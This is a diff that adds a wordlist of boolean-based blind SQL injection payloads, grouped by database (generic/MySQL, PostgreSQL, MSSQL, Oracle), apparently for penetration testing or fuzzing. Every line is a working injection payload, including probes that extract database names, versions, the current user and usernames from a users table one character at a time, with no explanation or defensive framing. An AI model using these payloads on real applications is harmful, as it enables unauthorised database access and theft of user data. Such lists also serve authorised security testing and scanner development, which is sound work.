@@ -1,0 +1,59 @@
+# SQLi Boolean-Based Blind Payloads
+' AND 1=1--
+' AND 1=2--
+' AND 1=1#
+' AND 1=2#
+' AND 'a'='a'--
+' AND 'a'='b'--
+' OR 1=1--
+' OR 1=2--
+' AND SUBSTRING(version(),1,1)='5'--
+' AND SUBSTRING(version(),1,1)='8'--
+' AND ASCII(SUBSTRING(version(),1,1))>50--
+' AND ASCII(SUBSTRING(version(),1,1))<60--
+' AND (SELECT LENGTH(database()))>0--
+' AND (SELECT LENGTH(database()))>5--
+' AND (SELECT LENGTH(database()))>10--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND (SELECT SUBSTRING(database(),1,1))='a'--
+' AND (SELECT SUBSTRING(database(),1,1))>'a'--
+' AND (SELECT SUBSTRING(database(),1,1))<'z'--
+' AND ORD(MID(database(),1,1))>96--
+' AND ORD(MID(database(),1,1))<123--
+' AND (SELECT IFNULL(CAST(COUNT(*) AS CHAR),0) FROM users)>'0'--
+' AND (SELECT MID(username,1,1) FROM users LIMIT 0,1)='a'--
+' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
+' AND 1=(SELECT 1 FROM dual WHERE 1=1)--
+' AND 1=(SELECT 1 FROM dual WHERE 1=2)--
+' AND (SELECT TOP 1 LEN(username) FROM users)>0--
+' AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)='a'--
+' AND UNICODE(SUBSTRING((SELECT TOP 1 username FROM users),1,1))>64--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+1' AND '1'='1
+1' AND '1'='2
+1') AND ('1'='1
+1') AND ('1'='2
+1')) AND (('1'='1
+1')) AND (('1'='2
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--
+' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--
+' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END FROM users LIMIT 1)=1--
+' AND IF(1=1,'a','b')='a'--
+' AND IF(1=2,'a','b')='a'--
+# PostgreSQL
+' AND (SELECT CASE WHEN (1=1) THEN true ELSE false END)--
+' AND (SELECT CASE WHEN (1=2) THEN true ELSE false END)--
+' AND (SELECT LENGTH(current_database()))>0--
+' AND (SELECT SUBSTRING(current_database(),1,1))='p'--
+# MSSQL
+' AND (SELECT LEN(DB_NAME()))>0--
+' AND IIF(1=1,'a','b')='a'--
+' AND IIF(1=2,'a','b')='a'--
+# Oracle
+' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END FROM dual)='a'--
+' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE 'b' END FROM dual)='a'--
+' AND (SELECT LENGTH(user) FROM dual)>0--
+' AND (SELECT SUBSTR(user,1,1) FROM dual)='S'--
